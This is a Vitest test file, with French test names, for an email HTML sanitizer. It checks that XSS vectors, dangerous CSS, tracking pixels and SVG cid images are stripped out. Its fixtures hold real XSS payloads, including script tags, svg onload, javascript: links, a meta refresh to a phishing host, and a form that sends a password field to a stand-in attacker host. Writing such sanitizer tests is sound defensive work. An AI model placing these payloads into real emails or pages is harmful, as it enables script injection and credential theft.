import { describe, expect, it } from 'vitest';
import {
  InlineCidResource,
  plainTextToSafeHtml,
  sanitizeEmailHtml,
} from './mail-sanitize';

describe('mail-sanitize — corpus XSS, tracking pixels & cid inline', () => {
  it('supprime les balises script, iframe, svg, object, form et meta refresh', () => {
    const dirty = [
      '<p>Bonjour</p>',
      '<script>alert("xss")</script>',
      '<iframe src="https://evil.example/frame" srcdoc="<script>alert(1)</script>"></iframe>',
      '<svg onload="alert(2)"><circle r="10"/></svg>',
      '<object data="javascript:alert(3)"></object>',
      '<meta http-equiv="refresh" content="0;url=https://phishing.example">',
      '<form action="https://evil.example/steal"><input name="pwd" type="password"><button>OK</button></form>',
    ].join('');

    const result = sanitizeEmailHtml(dirty);

    expect(result.html).toContain('<p>Bonjour</p>');
    expect(result.html).not.toMatch(/<script/i);
    expect(result.html).not.toMatch(/alert\(/i);
    expect(result.html).not.toMatch(/<iframe/i);
    expect(result.html).not.toMatch(/<svg/i);
    expect(result.html).not.toMatch(/<object/i);
    expect(result.html).not.toMatch(/<meta/i);
    expect(result.html).not.toMatch(/<form/i);
    expect(result.html).not.toMatch(/<input/i);
  });

  it('neutralise les gestionnaires d’événements on* et les liens javascript:/data:/vbscript:', () => {
    const dirty = [
      '<img src="x" onerror="alert(1)" onclick="alert(2)">',
      '<a href="javascript:alert(1)">Lien malveillant</a>',
      '<a href="  JaVaScRiPt:alert(2)">Lien obfusqué</a>',
      '<a href="data:text/html,<script>alert(3)</script>">Lien data</a>',
      '<a href="https://transimex-cm.com/devis">Lien valide</a>',
    ].join('');

    const result = sanitizeEmailHtml(dirty);

    expect(result.html).not.toMatch(/onerror/i);
    expect(result.html).not.toMatch(/onclick/i);
    expect(result.html).not.toMatch(/javascript:/i);
    expect(result.html).not.toMatch(/data:text\/html/i);
    expect(result.html).toContain('href="https://transimex-cm.com/devis"');
    expect(result.html).toContain('target="_blank"');
    expect(result.html).toContain('rel="noopener noreferrer nofollow"');
  });

  it('supprime le CSS dangereux (url(), expression(), position:fixed, z-index) tout en conservant le style sûr', () => {
    const dirty =
      '<div style="color: #1e293b; background-image: url(https://tracker.example/p.gif); position: fixed; z-index: 99999; width: expression(alert(1)); padding: 12px;">Texte</div>';

    const result = sanitizeEmailHtml(dirty);

    expect(result.html).toContain('color:#1e293b');
    expect(result.html).toContain('padding:12px');
    expect(result.html).not.toMatch(/url\(/i);
    expect(result.html).not.toMatch(/expression\(/i);
    expect(result.html).not.toMatch(/position\s*:/i);
    expect(result.html).not.toMatch(/z-index/i);
    expect(result.html).not.toMatch(/background-image/i);
  });

  it('bloque les images externes et pixels espions par défaut, puis les autorise sur opt-in explicite', () => {
    const dirty =
      '<p>Offre</p><img src="https://tracker.example/pixel.gif" width="1" height="1" alt="tracker">';

    const blocked = sanitizeEmailHtml(dirty, { allowRemoteImages: false });
    expect(blocked.hasBlockedRemoteImages).toBe(true);
    expect(blocked.blockedRemoteImagesCount).toBe(1);
    expect(blocked.html).not.toContain('https://tracker.example/pixel.gif');
    expect(blocked.html).toContain('data-blocked-src="1"');

    const allowed = sanitizeEmailHtml(dirty, { allowRemoteImages: true });
    expect(allowed.hasBlockedRemoteImages).toBe(false);
    expect(allowed.blockedRemoteImagesCount).toBe(0);
    expect(allowed.html).toContain('src="https://tracker.example/pixel.gif"');
    expect(allowed.html).toContain('loading="lazy"');
  });

  it('convertit les images cid: raster sûres (PNG) et refuse les images cid: SVG ou data:image/svg+xml', () => {
    const cidMap = new Map<string, InlineCidResource>([
      ['logo@transimex', { contentType: 'image/png', content: Buffer.from('fakepngbytes') }],
      ['evil@svg', { contentType: 'image/svg+xml', content: Buffer.from('<svg onload=alert(1)>') }],
    ]);

    const dirty = [
      '<img src="cid:logo@transimex" alt="Logo">',
      '<img src="cid:evil@svg" alt="SVG">',
      '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+" alt="DataSVG">',
    ].join('');

    const result = sanitizeEmailHtml(dirty, { inlineCidMap: cidMap });

    expect(result.html).toContain(
      `src="data:image/png;base64,${Buffer.from('fakepngbytes').toString('base64')}"`
    );
    expect(result.html).not.toContain('image/svg+xml');
    expect(result.hasBlockedRemoteImages).toBe(false);
  });

  it('échappe le texte brut et convertit les URL http(s) en liens sécurisés', () => {
    const html = plainTextToSafeHtml('Bonjour <script>alert(1)</script>\nVoir https://transimex-cm.com/offre');

    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(html).toContain('href="https://transimex-cm.com/offre"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });
});
